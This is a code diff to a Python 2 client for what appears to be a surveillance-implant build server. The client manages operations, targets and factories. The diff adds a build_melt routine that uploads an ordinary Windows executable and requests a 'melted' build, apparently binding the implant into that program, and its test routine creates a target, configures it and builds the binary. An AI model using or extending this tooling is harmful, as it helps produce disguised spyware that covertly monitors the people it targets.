@@ -3,7 +3,7 @@ from urllib2 import HTTPError
 import cookielib
 import json
 import subprocess,os
-
+import pprint
 
 class API:
 
@@ -45,10 +45,13 @@ class API:
         except HTTPError as e:
             print "Error processing %s: %s" % (link, e)
 
-    def call(self, api_name, data={}, binary=False):
-        
+    def call(self, api_name, data={}, binary = False, argjson = True):
         link = 'https://%s/%s' % (self.host, api_name)
-        resp = self.post_response(link, self.cookie, json.dumps(data))
+        arg = data
+        if argjson:
+            #print "json arg: " , data
+            arg = json.dumps(data)
+        resp = self.post_response(link, self.cookie, arg)
         if binary:
             return resp 
 
@@ -57,9 +60,8 @@ class API:
             return result
         except Exception, e:
             print e
-            print "error: ",resp
+            print "call error: ",resp
             raise e
-       
 
     def call_get(self, api_name):
         link = 'https://%s/%s' % (self.host, api_name)
@@ -109,9 +111,11 @@ class API:
     #    ret = [ op['_id'] for op in operations if op['name'] == target ]
     #    return ret
 
-    def targets(self, operation, target):
+    def targets(self, operation_id, target):
         operations = self.call_get('target')
-        ret = [ op['_id'] for op in operations if op['name'] == target and op['path'] == operation ]
+        #pp = pprint.PrettyPrinter(indent=4)
+        #pp.pprint(operations)
+        ret = [ op['_id'] for op in operations if op['name'] == target and op['path'][0] == operation_id ]
         return ret
 
     def target_delete(self, target_id):
@@ -262,6 +266,31 @@ class API:
         
         print "[*] bytes saved to %s" % out_file
 
+    def build_melt(self, factory, params, melt_file, out_file):
+        """ Build Silent or Melted Exe 
+        @param param_file 
+        @param factory
+        @param out_file
+        """
+
+        params['factory'] = { "_id": "%s" % factory } 
+
+        f = open(melt_file)
+        melt_id = self.call('upload', f.read(), binary = True, argjson = False)
+
+        params['melt']['input'] = melt_id
+        #:  Build: melting: {"admin"=>false, "bit64"=>true, "codec"=>true, "scout"=>true, "input"=>"4f60909baef1de0e4800000a-1361192221.897401094"}
+
+        print "[*] Build params: \n%s" % json.dumps(params)
+        #link  = 'https://%s/build' % self.host
+        #resp = self.post_response(link, json.dumps(params))
+        resp = self.call('build', params)
+        
+        out = open(out_file, 'wb')
+        out.write(resp)
+        
+        print "[*] bytes saved to %s" % out_file
+
 
 def test():
     print 'test'
@@ -272,17 +301,30 @@ def test():
     print conn.login()
  
     if(False):
-        operation, target, factory = '511dfd70aef1de05f8001090', '511e44d4aef1de05f800137a', '511e44d5aef1de05f8001380'
- 
+        operation, target, factory = '51222810aef1de0f040003f9','51222b77aef1de0f040005d0','51222b79aef1de0f040005d4'
+        config = open('assets/config.json').read()
+        conn.factory_add_config(factory, config)
+
     else:
         operation = conn.operation('AVMonitor')
-        target = conn.target_create(operation,'Turca','la mia targa')
-        factory = conn.factory_create(operation, target, 'desktop', 'fattoria', 'degli animali')
+        targets = conn.targets(operation, "Mazurca")
+
+        for t in targets:
+            print "delete target: ", t
+            conn.target_delete(t)
+
+        print "remained targets: ", conn.targets(operation, "Mazurca")
+
+        target = conn.target_create(operation,'Mazurca','la mia musica')
+        factory = conn.factory_create(operation, target, 'desktop', 'Bella fattoria', 'degli animali')
         print "factory: ", factory
         #sleep(10)
  
-        config = open('config.json').read()
+        config = open('assets/config.json').read()
         conn.factory_add_config(factory, config)
+
+        
+        print "targets: " , targets
  
     param = { 'platform': 'windows',
           'binary': { 'demo' : False, 'admin' : False},
@@ -292,19 +334,21 @@ def test():
  
     #{"admin"=>false, "bit64"=>true, "codec"=>true, "scout"=>true}
     try:
-        r = conn.build(factory, param, 'build.out')
+        #r = conn.build(factory, param, 'build.out')
+        print "build"
+        r = conn.build_melt(factory, param, 'assets/meltapp.exe', 'build.out')
+
     except Exception, e:
         print e
     
-    r = unzip('build.out')
-    print r
  
     r = conn.enum_instances( factory )
-    print r
+    print "instances: ",r
  
     #sleep(5)
     conn.target_delete(target)
-    print operation, target, factory
+    print "'%s','%s','%s' " % (operation, target, factory)
     print conn.logout()
+
 if __name__ == "__main__":
     test()
